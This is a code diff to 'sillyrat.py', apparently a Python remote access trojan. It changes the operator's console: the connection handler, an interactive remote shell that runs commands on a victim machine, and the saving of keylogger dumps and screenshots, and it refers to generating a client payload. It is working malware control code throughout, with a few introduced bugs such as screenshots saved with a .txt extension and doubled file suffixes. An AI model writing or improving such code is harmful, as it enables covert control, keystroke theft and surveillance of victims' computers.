@@ -67,8 +67,7 @@ usage: python3 sillyrat.py generate [--address ADDRESS] [--port PORT] [--output 
     -o, --output      Output file to generate
     -s, --source      Do not generate compiled code.
                       Gives Python source file.
-        --persistence Auto start on reboot [Under Development]
-
+                      
 The generate command generates the required payload
 file to be executed on client side. The establish
 connection to server and do commands.
@@ -278,22 +277,33 @@ class CLIENT:
 
     def acceptor(self):
         data = ""
-        chunk = ""
+        chunk = b""
 
-        while True:
-            chunk = self.sock.recv(4096)
-            if not chunk:
-                self.STATUS = "Disconnected"
-                break
-            data += chunk.decode('utf-8')
-            if self.KEY.encode('utf-8') in chunk:
-                try:
-                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8')).decode('utf-8')
-                except UnicodeDecodeError:
-                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8'))
-                if not self.MESSAGE:
-                    self.MESSAGE = " "
-                data = ""
+        try:
+            while True:
+                chunk = self.sock.recv(4096)
+                if not chunk:
+                    self.STATUS = "Disconnected"
+                    print("[!] Connection closed by remote host.")
+                    break
+
+                data += chunk.decode('utf-8')
+                if self.KEY.encode('utf-8') in chunk:
+                    try:
+                        self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8')).decode('utf-8')
+                    except UnicodeDecodeError:
+                        self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8'))
+                    if not self.MESSAGE:
+                        self.MESSAGE = " "
+                    data = ""
+
+        except ConnectionResetError:
+            self.STATUS = "Disconnected"
+            print("[!] Connection reset by remote host (server ถูกปิด)")
+        except Exception as e:
+            self.STATUS = "Error"
+            print(f"[!] Unexpected error: {e}")
+
 
     def engage(self):
         t = threading.Thread(target=self.acceptor)
@@ -388,28 +398,43 @@ class COMMCENTER:
         sys.stdout.write("\n")
 
     def c_shell(self):
-        result = ""
-        if self.CURRENT:
-            sys.stdout.write("\n")
-            while True:
-                val = input("# ")
-                val = "shell:" + val.rstrip(" ").lstrip(" ")
-
-                if val:
-                    if val != "shell:exit":
-                        self.CURRENT[1].send_data(val)
-                        result = self.CURRENT[1].recv_data()
-                        if result.strip(" "):
-                          print(result)
-                    else:
-                        break
-        else:
+        if not self.CURRENT:
             sys.stdout.write("\n")
             pull.error("You need to connect before execute this command!")
             sys.stdout.write("\n")
+            return
+
+        pull.function("Starting remote shell. Type 'exit' to quit.\n")
+
+        try:
+            while True:
+                hostname = getattr(self.CURRENT[1], "hostname", "remote")
+                prompt = f"{hostname}@{self.CURRENT[1].ip}> "
+
+                val = input(prompt).strip()
+
+                if val.lower() in ("exit", "quit"):
+                    break
+
+                if val == "":
+                    continue
+                cmd = f"shell:{val}"
+                self.CURRENT[1].send_data(cmd)
+
+                result = self.CURRENT[1].recv_data()
+
+                if result.strip():
+                    print(result)
+                else:
+                    print("[✓] Command executed but returned no output.")
+        except KeyboardInterrupt:
+            print("\n[!] Remote shell interrupted. Returning to main menu.")
+        except Exception as e:
+            pull.error(f"Shell Error: {str(e)}")
 
     def c_clear(self):
-        subprocess.call(["clear"], shell=True)
+        os.system('cls' if os.name == 'nt' else 'clear')
+
 
     def c_keylogger(self, args):
         if self.CURRENT:
@@ -438,7 +463,9 @@ class COMMCENTER:
                     dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
                     if not os.path.isdir(dirname):
                         os.mkdir(dirname)
-                    fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.txt") )
+                    def get_safe_timestamp():
+                        return datetime.now().strftime("%d-%m-%Y_%H-%M-%S.txt") 
+                    fullpath = os.path.join(dirname, f"{get_safe_timestamp()}.txt")
                     fl = open( fullpath, 'w' )
                     fl.write( result )
                     fl.close()
@@ -471,7 +498,7 @@ class COMMCENTER:
             dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
             if not os.path.isdir(dirname):
                 os.mkdir(dirname)
-            fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.png") )
+            fullpath = os.path.join(dirname, datetime.now().strftime("%d-%m-%Y_%H-%M-%S.txt"))
             fl = open( fullpath, 'wb' )
             fl.write( result )
             fl.close()
@@ -826,4 +853,10 @@ def main():
         pull.function("Done")
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        pull.exit("Exiting ...")
+    except Exception as e:
+        pull.error("An error occurred: %s" % str(e))
+        sys.exit(1)
